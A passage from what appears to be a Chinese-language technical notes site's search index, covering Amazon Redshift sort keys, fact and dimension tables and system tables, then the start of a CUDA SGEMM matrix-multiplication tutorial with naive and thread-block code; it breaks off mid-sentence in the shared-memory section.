<li>INTERLEAVED\uff1a\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u591a\u4e2a\u200b\u5217\u200b\uff0c\u200b\u4f46\u200b\u6700\u200b\u591a\u200b 8 \u200b\u5217\u200b\uff0c\u200b\u5b83\u200b\u76f8\u6bd4\u200b COMPOUND \u200b\u66f4\u200b\u590d\u6742\u200b\uff0c\u200b\u52a0\u8f7d\u200b\u6570\u636e\u200b\u65f6\u200b\u66f4\u6162\u200b\uff0c\u200b\u4f46\u662f\u200b\u6bd4\u8f83\u200b\u7075\u6d3b\u200b\uff0c\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u8981\u200b\u67e5\u8be2\u200b\u524d\u7f00\u200b\u5217\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4efb\u610f\u200b\u7ec4\u5408\u200b</li> </ol> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u5217\u200b\u9700\u8981\u200b\u6392\u5e8f\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5217\u200b\u7684\u200b\u5185\u5bb9\u200b\u53c8\u200b\u6709\u200b\u5f88\u591a\u200b\u76f8\u540c\u200b\u524d\u7f00\u200b\u7684\u200b\u65f6\u5019\u200b\uff08\u200b\u4f8b\u5982\u200b\u5927\u91cf\u200b URL \u200b\u5f00\u5934\u200b\u90fd\u200b\u662f\u200b <code>https://www</code>\uff09\uff0cCOMPOUND \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5b83\u200b\u4e3a\u4e86\u200b\u8282\u7701\u200b\u5b57\u7b26\u4e32\u200b\u6bd4\u8f83\u200b\u65f6\u95f4\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53ea\u200b\u9009\u53d6\u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u524d\u200b\u82e5\u5e72\u4e2a\u200b\u5b57\u8282\u200b\uff08\u200b\u4ece\u200b <code>STV_BLOCKLIST</code> \u200b\u7684\u200b <code>minvalue</code> \u200b\u548c\u200b <code>maxvalue</code> \u200b\u6765\u200b\u63a8\u65ad\u200b\uff0c\u200b\u662f\u200b\u524d\u200b 8 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff09\u200b\u6765\u200b\u6392\u5e8f\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6392\u5e8f\u200b\u7684\u200b\u6548\u679c\u200b\u5c31\u200b\u53d8\u5dee\u200b\u4e86\u200b\uff1b\u200b\u800c\u200b INTERLEAVED \u200b\u6a21\u5f0f\u200b\u4f1a\u200b\u505a\u200b\u7684\u200b\u66f4\u597d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u7ecf\u8fc7\u200b\u4e86\u200b\u538b\u7f29\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cINTERLEAVED \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u65ad\u200b\u5730\u5f80\u200b\u4e00\u4e2a\u200b\u5df2\u7ecf\u200b\u6709\u200b\u6570\u636e\u200b\u7684\u200b\u8868\u91cc\u200b\u6dfb\u52a0\u200b\u65b0\u200b\u6570\u636e\u200b\uff0c\u200b\u6570\u636e\u5206\u5e03\u200b\u51fa\u73b0\u200b\u53d8\u5316\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6027\u80fd\u200b\u4f1a\u200b\u9010\u6e10\u200b\u53d8\u5dee\u200b\uff0c\u200b\u9700\u8981\u200b\u7528\u200b VACUUM REINDEX \u200b\u547d\u4ee4\u200b\u91cd\u65b0\u200b\u8fdb\u884c\u200b\u6392\u5e8f\u200b\u3002\u200b\u5177\u4f53\u200b\u539f\u56e0\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0b\u9762\u200b\u7684\u200b\u5206\u6790\u200b\u6587\u7ae0\u200b\u91cc\u200b\u4e86\u89e3\u200b\u5230\u200b\u3002</p> <p>\u200b\u5173\u4e8e\u200b Sort key \u200b\u80cc\u540e\u200b\u7684\u200b\u5b9e\u73b0\u200b\u539f\u7406\u200b\uff0c\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b Interleaved Sort Keys in Amazon Redshift, Part 1 \u200b\u548c\u200b Interleaved Sort Keys in Amazon Redshift, Part 2\uff1a\u200b\u5b83\u200b\u89e3\u91ca\u200b\u4e86\u200b Redshift \u200b\u7684\u200b Sort key \u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u89e3\u91ca\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u5404\u79cd\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"software/redshift.html#fact-table-dimension-table","title":"Fact Table \u200b\u548c\u200b Dimension Table","text":"<p>\u200b\u5728\u200b Redshift \u200b\u6587\u6863\u200b\u91cc\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e24\u4e2a\u200b\u6570\u636e\u5206\u6790\u200b\u7684\u200b\u6982\u5ff5\u200b\uff1aFact Table \u200b\u548c\u200b Dimension Table\u3002Fact Table \u200b\u4e00\u822c\u200b\u662f\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u67d0\u4e2a\u200b\u4e8b\u60c5\u200b\u7684\u200b\u53d1\u751f\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u4e8b\u60c5\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u4eba\u200b\uff0c\u200b\u54ea\u4e9b\u200b\u7269\u54c1\u200b\uff0c\u200b\u53d1\u751f\u200b\u5728\u200b\u4ec0\u4e48\u200b\u65f6\u95f4\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u4eba\u200b\u548c\u200b\u7269\u54c1\u200b\u7684\u200b\u4fe1\u606f\u200b\u90fd\u200b\u662f\u200b\u7528\u200b ID \u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b\u53e6\u5916\u200b\u7684\u200b\u82e5\u5e72\u4e2a\u200b Dimension \u200b\u8868\u6765\u200b\u5177\u4f53\u200b\u4fdd\u5b58\u200b\u6bcf\u4e2a\u200b\u4eba\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7269\u54c1\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7b49\u7b49\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u7f51\u4e0a\u200b\u8d2d\u7269\u200b\u7cfb\u7edf\u200b\uff0cFact Table \u200b\u8bb0\u5f55\u200b\u4e86\u200b\u6240\u6709\u200b\u8ba2\u5355\u200b\uff0c\u200b\u8ba2\u5355\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u4e70\u5bb6\u200b\u7684\u200b ID\uff0c\u200b\u5356\u5bb6\u200b\u7684\u200b ID\uff0c\u200b\u5546\u54c1\u200b\u7684\u200b ID\uff0c\u200b\u5546\u54c1\u200b\u7684\u200b\u6570\u91cf\u200b\u548c\u200b\u4ef7\u683c\u200b\uff0c\u200b\u7136\u540e\u200b\u6709\u200b\u591a\u4e2a\u200b Dimension Table\uff0c\u200b\u6240\u6709\u200b\u4e70\u5bb6\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8868\u200b\uff0c\u200b\u5356\u5bb6\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8868\u200b\uff0c\u200b\u6240\u6709\u200b\u5546\u54c1\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8868\u200b\u3002</p> <p>\u200b\u8fd9\u6837\u200b\uff0cFact Table \u200b\u5c31\u662f\u200b\u6709\u200b\u5927\u91cf\u200b\u7684\u200b\u5230\u200b Dimension Table \u200b\u7684\u200b Foreign Key\u3002\u200b\u67e5\u8be2\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u628a\u200b Fact Table \u200b\u548c\u200b\u591a\u4e2a\u200b Dimension Table join \u200b\u8d77\u6765\u200b\u3002\u200b\u4f8b\u5982\u200b\u8981\u200b\u627e\u5230\u200b\u6240\u6709\u200b\u5356\u5bb6\u200b\u5728\u200b\u6bcf\u4e2a\u200b\u5546\u54c1\u200b\u5356\u51fa\u200b\u7684\u200b\u603b\u200b\u4ef7\u683c\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u628a\u200b Fact Table \u200b\u548c\u200b\u5356\u5bb6\u200b\u8868\u200b\u548c\u200b\u5546\u54c1\u200b\u8868\u200b join \u200b\u8d77\u6765\u200b\uff0c\u200b\u7136\u540e\u200b\u6309\u200b\u5356\u5bb6\u200b\u548c\u200b\u5546\u54c1\u200b\u8fdb\u884c\u200b group by\uff0c\u200b\u5bf9\u200b\u4ef7\u683c\u200b\u505a\u200b\u6c42\u548c\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u5bf9\u200b\u8fd9\u4e2a\u200b\u4f8b\u5b50\u200b\u4f18\u5316\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u8981\u200b\u6bd4\u8f83\u200b\u5356\u5bb6\u200b\u8868\u200b\u548c\u200b\u5546\u54c1\u200b\u8868\u200b\u8c01\u200b\u66f4\u200b\u5927\u200b\uff0c\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u5546\u54c1\u200b\u6bd4\u200b\u5356\u5bb6\u200b\u591a\u200b\uff0cjoin \u200b\u5546\u54c1\u200b\u8868\u82b1\u200b\u7684\u200b\u65f6\u95f4\u200b\u66f4\u957f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u8ba9\u200b\u8ba2\u5355\u200b\u5217\u8868\u200b\uff08Fact Table\uff09\u200b\u548c\u200b\u5546\u54c1\u200b\u8868\u90fd\u200b\u8bbe\u7f6e\u200b\u5546\u54c1\u200b ID \u200b\u4e3a\u200b Distribution key\u3002\u200b\u6b64\u65f6\u200b\u5356\u5bb6\u200b\u8868\u200b\u6ca1\u6709\u200b\u5546\u54c1\u200b ID \u200b\u8fd9\u200b\u4e00\u5217\u200b\uff0c\u200b\u6ca1\u6cd5\u200b\u6309\u7167\u200b\u5546\u54c1\u200b ID \u200b\u6765\u200b\u5206\u53d1\u200b\uff0c\u200b\u5982\u679c\u200b\u8bbe\u7f6e\u200b\u5356\u5bb6\u200b ID \u200b\u4e3a\u200b Distribution key\uff0c\u200b\u90a3\u200b\u5356\u5bb6\u200b\u7684\u200b\u5206\u5e03\u200b\u548c\u200b\u5546\u54c1\u200b\u7684\u200b\u5206\u5e03\u200b\u4e0d\u540c\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u6bd4\u8f83\u200b\u591a\u200b\u7684\u200b\u901a\u4fe1\u200b\uff0c\u200b\u4f46\u200b\u8003\u8651\u200b\u5230\u200b\u5356\u5bb6\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff0c\u200b\u6027\u80fd\u200b\u5f71\u54cd\u200b\u53ef\u80fd\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u5f88\u200b\u597d\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5356\u5bb6\u200b\u8868\u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b ALL distribution style\uff0c\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b node \u200b\u90fd\u200b\u6709\u200b\u4e00\u4efd\u200b\u5356\u5bb6\u200b\uff0c\u200b\u6bcf\u4e2a\u200b slice \u200b\u53ef\u4ee5\u200b\u4ece\u200b\u672c\u5730\u200b\u627e\u5230\u200b\u5356\u5bb6\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u901a\u4fe1\u200b\u3002\u200b\u5bf9\u4e8e\u200b Sort key\uff0c\u200b\u7531\u4e8e\u200b\u8ba2\u5355\u200b\u5217\u8868\u200b\u548c\u200b\u5546\u54c1\u200b\u8868\u200b\u9700\u8981\u200b\u5728\u200b\u5546\u54c1\u200b ID \u200b\u4e0a\u200b\u8fdb\u884c\u200b join\uff0c\u200b\u5f88\u200b\u81ea\u7136\u200b\u5730\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5546\u54c1\u200b ID \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b sort key\u3002\u200b\u8ba2\u5355\u200b\u5217\u8868\u200b\u548c\u200b\u5356\u5bb6\u200b\u8868\u200b\u9700\u8981\u200b\u5728\u200b\u5356\u5bb6\u200b ID \u200b\u4e0a\u200b\u8fdb\u884c\u200b join\uff0c\u200b\u4e8e\u662f\u200b\u5356\u5bb6\u200b\u8868\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5356\u5bb6\u200b ID \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b sort key\u3002</p>"},{"location":"software/redshift.html#_3","title":"\u5e38\u7528\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8868","text":"<ul> <li>SVL_QLOG\uff1a\u200b\u8bb0\u5f55\u200b\u4e86\u200b SQL \u200b\u67e5\u8be2\u200b\u65e5\u5fd7\u200b</li> <li>STV_BLOCKLIST\uff1a\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u6bcf\u4e2a\u200b 1MB block \u200b\u7684\u200b\u4fe1\u606f\u200b</li> </ul>"},{"location":"software/sgemm_cuda.html","title":"SGEMM on CUDA","text":"<p>\u200b\u4f7f\u7528\u200b CUDA \u200b\u5b9e\u73b0\u200b SGEMM\uff08\u200b\u51c6\u786e\u200b\u5730\u8bf4\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b \\(C=A*B\\)\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u5b8c\u6574\u200b\u7684\u200b GEMM \u200b\u8ba1\u7b97\u200b \\(C = \\alpha A*B + \\beta C\\)\uff09\u3002</p> <p>\u200b\u53c2\u8003\u200b\u4e86\u200b\u5982\u4e0b\u200b\u7684\u200b\u8d44\u6599\u200b\uff1a</p> <ul> <li>CUDA \u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\u7ec8\u6781\u200b\u4f18\u5316\u200b\u6307\u5357\u200b</li> <li>[\u200b\u65bd\u5de5\u200b\u4e2d\u200b] CUDA GEMM \u200b\u7406\u8bba\u200b\u6027\u80fd\u200b\u5206\u6790\u200b\u4e0e\u200b kernel \u200b\u4f18\u5316\u200b</li> <li>CUDA SGEMM \u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\u4f18\u5316\u200b\u7b14\u8bb0\u200b\u2014\u2014\u200b\u4ece\u200b\u5165\u95e8\u200b\u5230\u200b cublas</li> <li>CUDA Ampere Tensor Core HGEMM \u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\u4f18\u5316\u200b\u7b14\u8bb0\u200b \u2014\u2014 Up To 131 TFLOPS!</li> </ul>"},{"location":"software/sgemm_cuda.html#sgemm","title":"SGEMM \u200b\u5b9a\u4e49","text":"<p>SGEMM \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5355\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\u5f62\u5f0f\u200b\u662f\u200b \\(C = \\alpha A*B + \\beta C\\)\uff0c\u200b\u5728\u200b\u672c\u6587\u200b\u4e2d\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u57fa\u7840\u200b\u7684\u200b \\(C = A * B\\)\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u8bbe\u5b9a\u200b\u4e86\u200b \\(\\alpha = 1, \\beta = 0\\)\u3002\u200b\u672c\u6587\u200b\u7ea6\u5b9a\u200b\u7528\u200b row major \u200b\u7684\u200b\u4fdd\u5b58\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6240\u6709\u200b\u5c3a\u5bf8\u200b\u90fd\u200b\u662f\u200b\u5148\u884c\u200b\u540e\u5217\u200b\u3002</p> <p>\u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\u6309\u7167\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff1a</p> <pre><code>// Input\nfloat a[m][k];\nfloat b[k][n];\n\n// Output\nfloat c[m][n];\n\nfor (int i = 0;i &lt; m;i++) {\n    for (int j = 0;j &lt; n;j++) {\n        c[i][j] = 0;\n        for (int l = 0;l &lt; k;l++) {\n            c[i][j] += a[i][l] * b[l][j];\n        }\n    }\n}\n</code></pre> <p>\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5faa\u73af\u200b C \u200b\u77e9\u9635\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u7136\u540e\u200b\u8ba1\u7b97\u200b A \u200b\u77e9\u9635\u200b\u4e00\u884c\u200b\u548c\u200b B \u200b\u77e9\u9635\u200b\u4e00\u5217\u200b\u7684\u200b\u5185\u79ef\u200b\uff0c\u200b\u7ed3\u679c\u200b\u5c31\u662f\u200b C \u200b\u77e9\u9635\u200b\u8be5\u200b\u5143\u7d20\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u7ea6\u5b9a\u200b A \u200b\u77e9\u9635\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b \\(m*k\\)\uff0cB \u200b\u77e9\u9635\u200b\u5927\u5c0f\u200b\u662f\u200b \\(k*n\\)\uff0cC \u200b\u77e9\u9635\u200b\u5927\u5c0f\u200b\u662f\u200b \\(m*n\\)\u3002</p>"},{"location":"software/sgemm_cuda.html#sgemm-v1","title":"SGEMM v1","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u601d\u8003\u200b\u5982\u4f55\u200b\u7528\u200b CUDA \u200b\u5b9e\u73b0\u200b\u3002\u200b\u5728\u200b CUDA \u200b\u4e2d\u200b\uff0c\u200b\u542f\u52a8\u200b kernel \u200b\u7684\u200b\u5355\u4f4d\u200b\u662f\u200b grid\uff0c\u200b\u4e00\u4e2a\u200b grid \u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b block\uff0c\u200b\u6bcf\u4e2a\u200b block \u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b thread\u3002\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u60f3\u200b\u597d\u200b\u6bcf\u4e2a\u200b thread \u200b\u8d1f\u8d23\u200b\u4ec0\u4e48\u200b\u4efb\u52a1\u200b\uff0c\u200b\u518d\u200b\u53bb\u200b\u601d\u8003\u200b block \u200b\u7684\u200b\u5927\u5c0f\u200b\u4ee5\u53ca\u200b grid \u200b\u7684\u200b\u5927\u5c0f\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u6bd4\u8f83\u7b80\u5355\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u65e2\u7136\u200b\u8981\u200b\u679a\u4e3e\u200b C \u200b\u77e9\u9635\u200b\u7684\u200b \\(m*n\\) \u200b\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u90a3\u200b\u5c31\u8ba9\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b C \u200b\u77e9\u9635\u7684\u5143\u200b\u7d20\u200b\uff0c\u200b\u7ebf\u7a0b\u200b\u5185\u8981\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u5c31\u662f\u200b\uff0c\u200b\u5bf9\u200b K \u200b\u5faa\u73af\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u4e24\u4e2a\u200b\u5411\u91cf\u200b\u7684\u200b\u5185\u79ef\u200b\uff0c\u200b\u6700\u540e\u200b\u5199\u5165\u200b C \u200b\u77e9\u9635\u200b\uff1a</p> <pre><code>// x, y: the x and y index of the current thread\nfloat sum = 0.0;\nfor (int i = 0; i &lt; k; i++) {\n    // sum += a[x][i] * b[i][y];\n    sum += a[IDX2C(x, i, k)] * b[IDX2C(i, y, n)];\n}\n\n// c[x][y] = sum;\nc[IDX2C(x, y, n)] = sum;\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>IDX2C</code> \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u8ba1\u7b97\u200b\u4e8c\u7ef4\u200b\u77e9\u9635\u200b\u4e0b\u6807\u200b\u5bf9\u5e94\u200b\u7684\u200b\u4e00\u7ef4\u200b\u4e0b\u6807\u200b\uff1a</p> <pre><code>#define IDX2C(i, j, ld) (((i) * (ld)) + (j))\n</code></pre> <p>\u200b\u56e0\u4e3a\u200b\u662f\u200b row major\uff0c\u200b\u6240\u4ee5\u200b i \u200b\u662f\u200b\u884c\u200b\u4e0b\u6807\u200b\uff0cj \u200b\u662f\u200b\u5217\u200b\u4e0b\u6807\u200b\uff0cld \u200b\u5c31\u662f\u200b\u4e00\u884c\u200b\u7684\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u662f\u200b\u77e9\u9635\u200b\u7684\u200b\u5217\u6570\u200b\u3002\u200b\u56e0\u6b64\u200b <code>a[x][i]</code> \u200b\u5c31\u200b\u53d8\u6210\u200b\u4e86\u200b <code>a[IDX2C(x, i, k)]</code>\uff0ck \u200b\u5c31\u662f\u200b a \u200b\u77e9\u9635\u200b\u7684\u200b\u5217\u6570\u200b\uff0c\u200b\u540c\u7406\u200b <code>b[i][y]</code> \u200b\u53d8\u6210\u200b\u4e86\u200b <code>b[IDX2C(i, y, n)]</code>\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b C \u200b\u77e9\u9635\u200b\u4e2d\u200b\u5355\u4e2a\u200b\u5143\u7d20\u200b\u7684\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c31\u200b\u9700\u8981\u200b\u601d\u8003\u200b grid \u200b\u6709\u200b\u591a\u5c11\u200b\u4e2a\u200b block\uff0cblock \u200b\u6709\u200b\u591a\u5c11\u200b\u4e2a\u200b thread \u200b\u4e86\u200b\u3002\u200b\u7531\u4e8e\u200b C \u200b\u77e9\u9635\u200b\u4e00\u5171\u200b\u662f\u200b \\(m*n\\) \u200b\u4e2a\u200b\u5143\u7d20\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6700\u7ec8\u200b\u662f\u200b\u5e0c\u671b\u200b\u6709\u200b \\(m*n\\) \u200b\u4e2a\u200b thread\u3002CUDA \u200b\u9650\u5236\u200b\u6bcf\u4e2a\u200b block \u200b\u6700\u591a\u200b\u6709\u200b 1024 \u200b\u4e2a\u200b thread\uff0c\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u200b\uff0c\u200b\u5c31\u8ba9\u200b\u6bcf\u4e2a\u200b block \u200b\u5305\u62ec\u200b \\(32*32\\) \u200b\u4e2a\u200b thread\uff0c\u200b\u6bcf\u4e2a\u200b block \u200b\u8d1f\u8d23\u200b \\(32*32\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff1a</p> <pre><code>//            n\n//\n//    +-------+-------+\n//    |       |       |\n//    | 32x32 | 32x32 |\n//    |       |       |\n// m  +-------+-------+\n//    |       |       |\n//    | 32x32 | 32x32 |\n//    |       |       |\n//    +-------+-------+\n//\n//            C\n#define BLOCK_SIZE_PER_THREAD_BLOCK 32\nblockDim-&gt;x = BLOCK_SIZE_PER_THREAD_BLOCK;\nblockDim-&gt;y = BLOCK_SIZE_PER_THREAD_BLOCK;\nblockDim-&gt;z = 1;\n</code></pre> <p>\u200b\u8fd9\u6837\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u662f\u200b\u628a\u200b C \u200b\u77e9\u9635\u200b\u5206\u6210\u200b\u4e86\u200b\u82e5\u5e72\u4e2a\u200b \\(32*32\\) \u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5b50\u200b\u77e9\u9635\u200b\u4ea4\u7ed9\u200b\u4e00\u4e2a\u200b thread block \u200b\u53bb\u200b\u6267\u884c\u200b\u3002\u200b\u5b50\u200b\u77e9\u9635\u200b\u7684\u200b\u4e2a\u6570\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u770b\u200b m \u200b\u548c\u200b n \u200b\u9664\u4ee5\u200b 32 \u200b\u662f\u200b\u591a\u5c11\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u80fd\u200b\u6574\u9664\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5411\u4e0a\u200b\u53d6\u6574\u200b\uff1a</p> <pre><code>#define BLOCK_SIZE_PER_THREAD_BLOCK 32\ngridDim.x =\n    (m + (BLOCK_SIZE_PER_THREAD_BLOCK - 1)) / BLOCK_SIZE_PER_THREAD_BLOCK;\ngridDim.y =\n    (n + (BLOCK_SIZE_PER_THREAD_BLOCK - 1)) / BLOCK_SIZE_PER_THREAD_BLOCK;\ngridDim.z = 1;\n</code></pre> <p>\u200b\u5728\u200b\u8fd9\u6837\u200b\u7684\u200b\u8bbe\u5b9a\u200b\u4e0b\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\u5730\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u6bcf\u4e2a\u200b thread \u200b\u8d1f\u8d23\u200b\u7684\u200b C \u200b\u77e9\u9635\u7684\u5143\u200b\u7d20\u200b\u7684\u200b\u884c\u5217\u200b\u4e0b\u6807\u200b\uff1a</p> <pre><code>// each thread handles one element in C matrix\n//          n=3\n//     +---+---+---+\n//     |t00|t01|t02|\n//     +---+---+---+\n//     |t10|t11|t12|\n// m=4 +---+---+---+\n//     |t20|t21|t22|\n//     +---+---+---+\n//     |t30|t31|t32|\n//     +---+---+---+\n//\n//           C\nint x = blockDim.x * blockIdx.x + threadIdx.x;\nint y = blockDim.y * blockIdx.y + threadIdx.y;\n</code></pre> <p>\u200b\u7ed3\u5408\u200b\u8fd9\u4e9b\u200b\u4ee3\u7801\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u57fa\u7840\u200b\u7684\u200b SGEMM \u200b\u4ee3\u7801\u200b\u3002</p>"},{"location":"software/sgemm_cuda.html#sgemm-v2","title":"SGEMM v2","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u7b2c\u4e8c\u4e2a\u200b\u7248\u672c\u200b\uff0c\u200b\u5728\u200b\u7b2c\u4e00\u4e2a\u200b\u7248\u672c\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u628a\u200b shared memory \u200b\u4f7f\u7528\u200b\u4e0a\u200b\u3002Shared memory \u200b\u662f\u200b CUDA \u200b\u6bcf\u4e2a\u200b SM \u200b\u5185\u90e8\u200b\u7684\u200b\u5b58\u50a8\u200b\uff0c\u200b\u53ef\u200b\u4f9b\u200b\u540c\u4e00\u4e2a\u200b Block \u200b\u5185\u200b\u7684\u200b thread \u200b\u5171\u4eab\u200b\uff0c\u200b\u6bd4\u200b\u8bbf\u95ee\u200b Global memory \u200b\u6027\u80fd\u200b\u66f4\u597d\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u8981\u200b\u601d\u8003\u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b shared memory\u3002\u200b\u76ee\u524d\u200b\u7684\u200b\u8bbe\u5b9a\u200b\u662f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u8d1f\u8d23\u200b 1 \u200b\u4e2a\u200b C \u200b\u77e9\u9635\u7684\u5143\u200b\u7d20\u200b\uff0c\u200b\u6bcf\u4e2a\u200b thread block \u200b\u8d1f\u8d23\u200b \\(32*32\\) \u200b\u7684\u200b C \u200b\u77e9\u9635\u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b\u3002\u200b\u8fd9\u4e2a\u200b thread block \u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b A \u200b\u77e9\u9635\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b\u4e00\u4e2a\u200b\u957f\u6761\u5f62\u200b\u7684\u200b\u5b50\u200b\u77e9\u9635\u200b \\(32 * k\\)\uff0c\u200b\u6d89\u53ca\u200b\u5230\u200b B \u200b\u77e9\u9635\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b \\(k * 32\\)\u3002\u200b\u7531\u4e8e\u200b \\(k\\) 